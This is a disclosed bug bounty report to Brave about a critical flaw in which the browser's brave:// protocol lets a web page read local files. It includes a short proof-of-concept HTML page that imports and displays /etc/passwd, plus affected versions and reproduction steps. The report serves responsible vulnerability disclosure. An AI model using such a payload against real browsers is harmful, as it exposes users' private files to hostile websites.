# Local files reading from the web using `brave://`

## Report Details
- **Report ID**: 390013
- **URL**: https://hackerone.com/reports/390013
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-08-03T02:40:34.651Z
- **Disclosed**: 2018-09-25T00:05:47.401Z

## Reporter
- **Username**: metnew
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: brave

## Vulnerability Information
## Summary:

`brave://` protocol was introduced as a replacement for `AsarProtocolHandler`(or something like that) in `brave/muon` after #375329. 

However, fix for #375329 introduced a new much severe bug that allows reading files from a user's device from the web.

PoC is similar to #375329, but it uses `brave://` instead of `file://`:
```
<head>
    <script>
        function show() {
            var file = link.import.querySelector('body')
            alert(file.innerHTML)
        }
    </script>
    <link id="link" href="brave:///etc/passwd" rel="import" as="document" onload="show()" />
</head>
```

## Products affected: 

Brave: 0.23.73 
V8: 6.8.275.24 
rev: 50bdb6df42550dd14f5636770ec8585aa26e361b 
Muon: 8.0.3 
OS Release: 17.7.0 
Update Channel: Release 
OS Architecture: x64 
OS Platform: macOS 
Node.js: 7.9.0 
Brave Sync: v1.4.2 
libchromiumcontent: 68.0.3440.75

## Steps To Reproduce:

1. Open `exploit.html` from the web
2. Page alerts contents of `file:///etc/passwd`

## Supporting Material

Screencast attached.

## Impact

Reading local files from the web is a critical vulnerability.
I'm investigating this issue more detailed now, maybe impact is much severe than reading local files.

## Attachments
- brave-read-local-files-from-the-web.mp4
- exploit.html
